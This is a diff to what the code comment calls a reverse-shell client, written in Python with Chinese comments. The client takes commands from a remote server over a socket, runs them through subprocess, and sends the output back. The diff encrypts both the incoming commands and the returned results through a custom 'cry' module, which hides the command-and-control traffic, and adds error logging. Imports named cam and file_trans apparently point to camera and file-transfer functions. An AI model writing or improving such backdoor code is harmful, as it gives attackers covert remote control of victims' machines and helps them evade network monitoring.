@@ -8,6 +8,7 @@ import file_trans
 import cam
 import settings
 import subprocess
+import cry
 
 #反弹shell客户端
 
@@ -25,9 +26,11 @@ def send_message():
     while True:
         try:
             try:
-                cmd = client_socket.recv(1024).decode()  # 解码获取命令
-            except:
+                cmd_encrypted = client_socket.recv(1024).decode()  # 解码获取命令
+                cmd = cry.decrypt(cmd_encrypted, settings.get_key())
+            except Exception as e:
                 cmd = ""
+                print("接收error" + str(e))
             if cmd.startswith("cd"):
                 try:
                     os.chdir(cmd[2:].strip())  # 切换路径
@@ -71,11 +74,15 @@ def send_message():
                     process.wait(timeout=2) #确保进程在终止后已经完成
                     cmd = ""
                     result = "10s内超时异常，已结束进程"
+                    print("10s内超时异常，已结束进程")
             if result:
                 try:
-                    client_socket.sendall(result.encode('utf-8'))  # 编码发送反馈
+                    encrypted_result = cry.encrypt(result, settings.get_key())
+                    client_socket.sendall(encrypted_result.encode('utf-8'))  # 编码发送反馈
                     result = ""
+                    encrypted_result = ""
                 except:
+                    print("发送error")
                     pass
             elif not result:
                 client_socket.send("cmd_shell无返回数据".encode('utf-8'))
@@ -83,6 +90,7 @@ def send_message():
             time.sleep(3)
             client_socket.close()
             client_socket = connect_server()
+            print("error")
 
 if __name__ == '__main__':
     thread1 = threading.Thread(target=send_message)
